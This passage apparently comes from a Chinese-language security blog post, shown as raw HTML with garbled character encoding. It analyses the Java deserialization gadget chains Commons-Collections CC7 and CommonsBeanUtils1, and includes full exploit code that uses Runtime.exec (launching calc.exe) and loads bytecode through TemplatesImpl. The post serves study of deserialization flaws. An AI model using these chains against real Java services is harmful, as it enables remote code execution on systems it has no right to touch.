class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc7.bin&quot;</span>));<br>            outputStream.writeObject(hashtable);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc7.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨åˆ†æå‰è¯´ä¸‹ä¹‹å‰çš„é—®é¢˜ï¼šå³ä¸ç®¡æ˜¯<code>reconstitutionPut</code>æ–¹æ³•è¿˜æ˜¯<code>equals</code>æ–¹æ³•ï¼Œéƒ½å¾—å…ˆè¿›<code>for</code>å¾ªç¯æ‰è¡Œï¼šè¿™é‡Œä¸»è¦çœ‹<code>hashtable</code>ä¸‹çš„<code>reconstitutionPut</code>ä¸­çš„<code>for</code>å¾ªç¯æ€ä¹ˆæ»¡è¶³ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure><p>reconstitutionPutæ–¹æ³•é¦–å…ˆå¯¹valueè¿›è¡Œä¸ä¸ºnullçš„æ ¡éªŒï¼Œå¦åˆ™æŠ›å‡ºååºåˆ—åŒ–å¼‚å¸¸ï¼Œç„¶åæ ¹æ®keyè®¡ç®—å‡ºå…ƒç´ åœ¨tableæ•°ç»„ä¸­çš„å­˜å‚¨ç´¢å¼•ï¼Œåˆ¤æ–­å…ƒç´ åœ¨tableæ•°ç»„ä¸­æ˜¯å¦é‡å¤ï¼Œå¦‚æœé‡å¤åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚æœä¸é‡å¤åˆ™å°†å…ƒç´ è½¬æ¢æˆEntryå¹¶æ·»åŠ åˆ°tablæ•°ç»„ä¸­ã€‚</p><p>CC7åˆ©ç”¨é“¾çš„æ¼æ´è§¦å‘çš„å…³é”®å°±åœ¨reconstitutionPutæ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•åœ¨åˆ¤æ–­é‡å¤å…ƒç´ çš„æ—¶å€™æ ¡éªŒäº†ä¸¤ä¸ªå…ƒç´ çš„hashå€¼æ˜¯å¦ä¸€æ ·ï¼Œç„¶åæ¥ç€keyä¼šè°ƒç”¨equalsæ–¹æ³•åˆ¤æ–­keyæ˜¯å¦é‡å¤æ—¶å°±ä¼šè§¦å‘æ¼æ´ã€‚</p><p>æ·»åŠ ç¬¬ä¸€ä¸ªå…ƒç´ æ—¶å¹¶ä¸ä¼šè¿›å…¥ifè¯­å¥è°ƒç”¨equalsæ–¹æ³•è¿›è¡Œåˆ¤æ–­(e &#x3D; e.nextç„¶åç¬¬ä¸€ä¸ªifçš„å†…å®¹æ˜¯<code>e.hash == hash</code>ï¼Œè¦æ˜¯åªæœ‰ä¸€ä¸ªçš„è¯è¿e.nextéƒ½æ²¡æœ‰)ï¼Œå› æ­¤Hashtableä¸­çš„å…ƒç´ è‡³å°‘ä¸º2ä¸ªå¹¶ä¸”å…ƒç´ çš„hashå€¼ä¹Ÿå¿…é¡»ç›¸åŒçš„æƒ…å†µä¸‹æ‰ä¼šè°ƒç”¨equalsæ–¹æ³•ï¼Œå¦åˆ™ä¸ä¼šè§¦å‘æ¼æ´ã€‚</p><p>ç„¶åæ³¨æ„è¿™ä¸ª<code>equals</code>æ–¹æ³•ï¼šæœ€ç»ˆåˆ©ç”¨<code>e.key.equals()</code>è°ƒç”¨äº†<code>LazyMap</code>çš„<code>equals</code>æ–¹æ³•(å¾€<code>hashtable</code>ä¸­<code>put</code>äº†lazymapçš„å®ä¾‹)ï¼Œä½†æ˜¯LazyMapä¸­å¹¶æ²¡æœ‰equalsæ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†LazyMapçš„çˆ¶ç±»AbstractMapDecoratorçš„equalsæ–¹æ³•ï¼Œè™½ç„¶AbstractMapDecoratoræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä½†å®ƒå®ç°äº†equalsæ–¹æ³•ã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;&#125;;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¼„äº†ä¸¤ä¸ª<code>Transformer</code>æ•°ç»„ï¼Œä¸€ä¸ª<code>fakeTransformers</code>å’Œä¸€ä¸ª<code>transformers</code>ã€‚è¿™é‡Œçš„ç”¨æ³•å’Œæˆ‘ä»¬ä¹‹å‰éšä¾¿æ”¹ä¸ªå€¼é‚£ç§æ–¹æ³•çš„ç›®æ ‡æ˜¯ä¸€æ ·çš„ï¼š</p><p><code>put</code>æ—¶åŒæ ·ä¼šè§¦å‘<code>equals</code>æ–¹æ³•ï¼š</p><p><img src="/img/putwhat.png" alt="putwhat"></p><p>å…ˆç”¨è¿™ä¸ª<code>fake</code>ç­‰<code>put</code>å®Œäº†é€šè¿‡åå°„æ”¹å›æ¥å°±è¡Œã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>å…ˆå°†<code>fakeTransformers</code>ä¼ å…¥<code>ChainedTransformer</code>å¯¹è±¡ï¼›</p><p> newä¸¤ä¸ª<code>HashMap</code>å¯¹è±¡ï¼Œéƒ½è°ƒç”¨<code>LazyMap.decorate</code>ï¼Œå¹¶ä¸”åˆ†åˆ«å‘ä¸¤ä¸ªå¯¹è±¡ä¸­ä¼ å€¼ï¼Œä¸¤ä¸ªkeyå€¼åˆ†åˆ«ä¸º<code>yy</code>å’Œ<code>zZ</code>ï¼Œå› ä¸ºéœ€è¦è¿™ä¸¤ä¸ªå€¼çš„hashå€¼ç›¸ç­‰ï¼Œè€Œåœ¨javaä¸­ï¼Œ<code>yy</code>å’Œ<code>zZ</code>çš„hashå€¼æ°å¥½ç›¸ç­‰ï¼›</p><p><img src="/img/20211031133342-1bd17e2e-3a0c-1.png" alt="20211031133342-1bd17e2e-3a0c-1"></p><p>ç„¶åå°†è¿™ä¸¤ä¸ªLazyMapç±»å¯¹è±¡putè¿›Hashtableç±»å¯¹è±¡ï¼›</p><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br>lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<span class="hljs-comment">//åˆ é™¤é”®ä¸ºyyçš„é”®å€¼å¯¹</span><br></code></pre></td></tr></table></figure><p>å›é¡¾ä¸‹è¿™ä¸ª<code>iTransformers</code>æ˜¯ä»€ä¹ˆï¼š</p><p><img src="/img/iTransformers.png" alt="iTransformers"></p><p>é€šè¿‡åå°„è·å–<code>ChainedTransformer</code>çš„<code>iTransformers</code>å˜é‡ï¼Œå°†å«æœ‰æˆ‘ä»¬ååºåˆ—åŒ–æ—¶è¦æ‰§è¡Œçš„å‘½ä»¤çš„<code>transformers</code>æ•°ç»„ä¼ è¿›å»ï¼Œæ›¿æ¢å‰é¢çš„<code>fakeTransformers</code>ï¼›</p><p>ä¸ºä»€ä¹ˆè¦åˆ é™¤<code>lazymap2</code>ä¸­çš„<code>yy</code>é”®å€¼å¯¹ï¼Ÿè¿™ä¸ªé”®å€¼å¯¹æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Ÿ</p><p>Hashtableåœ¨è°ƒç”¨putæ–¹æ³•æ·»åŠ å…ƒç´ çš„æ—¶å€™ä¼šè°ƒç”¨equalsæ–¹æ³•åˆ¤æ–­æ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡ï¼Œè€Œåœ¨equalsä¸­ä¼šè°ƒç”¨LazyMapçš„getæ–¹æ³•æ·»åŠ ä¸€ä¸ªå…ƒç´ ï¼ˆyy&#x3D;yyï¼‰ã€‚</p><p>å”‰ï¼Œæˆ‘æ˜¯æ‡’ç‹—ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™ä½å¸ˆå‚…çš„åˆ†æï¼š</p><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">yy&#x3D;yy</a></p><p>å¦‚æœä¸æŠŠè¿™ä¸ª<code>yy</code>åˆ æ‰ï¼Œååºåˆ—åŒ–èµ°åˆ°<code>AbstractMap</code>çš„<code>equals</code>æ—¶ï¼š</p><p><img src="/img/equal.png" alt="equal"></p><p>å¯ä»¥çœ‹åˆ°å½“ä¸¤ä¸ª<code>size</code>ä¸ç›¸ç­‰å°±ç›´æ¥è¿”å›<code>False</code>äº†ã€‚</p><h2 id="CommonsBeanUtils1"><a href="#CommonsBeanUtils1" class="headerlink" title="CommonsBeanUtils1"></a>CommonsBeanUtils1</h2><p><a href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x04-CommonsBeanUtils1-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">å‚è€ƒæ–‡ç« </a></p><p>é¦–å…ˆCommons-BeanUtils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• <code>PropertyUtils.getProperty</code> ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Baby.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Baby</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Drunkbaby&quot;</span>;  <br>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> name;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span> <span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//CBMethods.java</span><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CBMethods</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Baby</span>(), <span class="hljs-string">&quot;name&quot;</span>));  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//ç»“æœï¼šDrunkbaby</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹å°±æ˜¯å¯ä»¥ç”¨è¿™ä¸ªé™æ€æ–¹æ³•å»è°ƒé™æ€ç±»åŠ è½½é‚£ç« ä¸­çš„<code>getOutputProperties()</code>ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>(åŠ¨æ€ç±»åŠ è½½é‚£é‡Œå°±ä¸ç»†è¯´äº†ï¼Œå°±æ˜¯CC3é‚£äº›)</p><p><code>BeanComparator.compare()</code> æ–¹æ³•ï¼š</p><p><img src="/img/compare.png" alt="compare"></p><p>è¿™ä¸ªæ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ï¼›å¦‚æœ this.property ä¸ä¸ºç©ºï¼Œåˆ™ç”¨ PropertyUtils.getProperty åˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ this.property å±æ€§ï¼Œæ¯”è¾ƒå±æ€§çš„å€¼ã€‚</p><p>æ‰€ä»¥å¦‚æœéœ€è¦ä¼ å€¼æ¯”è¾ƒï¼Œè‚¯å®šæ˜¯éœ€è¦æ–°å»ºä¸€ä¸ª <code>PriorityQueue</code> çš„é˜Ÿåˆ—ï¼Œå¹¶è®©å…¶æœ‰ 2 ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒã€‚è€Œä¸” <code>PriorityQueue</code> çš„æ„é€ å‡½æ•°å½“ä¸­å°±åŒ…å«äº†ä¸€ä¸ªæ¯”è¾ƒå™¨ã€‚</p><p><img src="/img/PriorityConstructor.png" alt="PriorityConstructor"></p><p>æœ€åä½¿ç”¨ queue.add å°±å¯ä»¥è‡ªåŠ¨å®Œæˆæ¯”è¾ƒæ˜¯å› ä¸º add æ–¹æ³•è°ƒç”¨äº† compare æ–¹æ³•ï¼Œå¦‚å›¾</p><p><img src="/img/Route.png" alt="Route"></p><p>æ‰€ä»¥åˆæ­¥EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonBeans1EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br> <span class="hljs-comment">// å°† property çš„å€¼èµ‹ä¸º outputProperties </span><br> setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br> <span class="hljs-comment">// åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç   </span><br> <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);  <br> queue.add(templates);  <span class="hljs-comment">//addæœ€ç»ˆè°ƒç”¨comparator.compareï¼Œè¿™é‡Œçš„comparatorè¢«èµ‹å€¼ä¸ºbeanComparatorã€‚</span><br> queue.add(templates);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>new</code>äº†ä¸¤ä¸ªå®ä¾‹ï¼š<code>beanComparator</code>å’Œ<code>PriorityQueue</code>ï¼Œè¿™é‡Œå…ˆçœ‹ä¸‹å®ƒä¿©çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br><span class="hljs-comment">//BeanComparatorçš„æ„é€ æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> String property;<br>    <span class="hljs-keyword">private</span> Comparator comparator;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯<code>new</code>äº†ä¸€ä¸ª<code>BeanComparator</code>ï¼Œç­‰ä¸‹è¦åˆ©ç”¨è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•å»è°ƒç”¨<code>(get)Property</code>æ–¹æ³•ï¼Œå¦‚å›¾ï¼š</p><p><img src="/img/FindCompare.png" alt="FindCompare"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator); <br></code></pre></td></tr></table></figure><p><code>new</code>äº†ä¸€ä¸ª<code>PriorityQueue</code>å®ä¾‹ï¼Œçœ‹ä¸‹å®ƒçš„æ„é€ å‡½æ•°:</p><p><img src="/img/priorityquee.png" alt="priorityquee"></p><p>æ‰€ä»¥è¿™ä¸ªé˜Ÿåˆ—é‡Œå®¹çº³çš„åˆå§‹å…ƒç´ ä¸º2ï¼Œç„¶å<code>comparator</code>ä¸º<code>beanComparator</code>ï¼Œç„¶å<code>PriorityQueue</code> è¿™ä¸ªç±»çš„ <code>siftDownUsingComparator()</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>compare()</code>:</p><p><img src="/img/siftDownUsingComparator.png" alt="siftDownUsingComparator"></p><p>æœ€ç»ˆå°±æˆäº†<code>BeanComparator.compare()</code></p><p>ç®€å•æ¢³ç†ä¸€ä¸‹ï¼š</p><p><code>queue.add(templates);</code> addæœ€ç»ˆè°ƒç”¨<code>comparator.compare</code>ï¼Œè¿™é‡Œçš„<code>comparator</code>è¢«èµ‹å€¼ä¸º<code>beanComparator</code>ï¼Œå³<code>beanComparator.compare</code></p><p>ç„¶åè¿™ä¸ª<code>compare</code>æ–¹æ³•å›å»è°ƒ<code>PropertyUtils.getProperty(o1, propeery)</code>ã€‚è¿™é‡Œ<code>property</code>çš„å€¼ä¸º<code>outputProperties</code>ã€‚<code>o1</code>éœ€è¦æ˜¯<code>TemplatesImpl</code>çš„å®ä¾‹å³ä¸Šé¢é‚£ä¸ª<code>templates</code>ã€‚</p><p> <code>queue.add(templates);  </code>è¿™é‡Œçš„<code>templates</code>å°±ç›¸å½“äºè¦è¢«æ¯”è¾ƒçš„<code>o1ï¼Œo2</code>äº†ã€‚</p><p>èµ°åˆ°<code>compare</code>å°±ç›¸å½“äºè¿™ä¸ªï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span 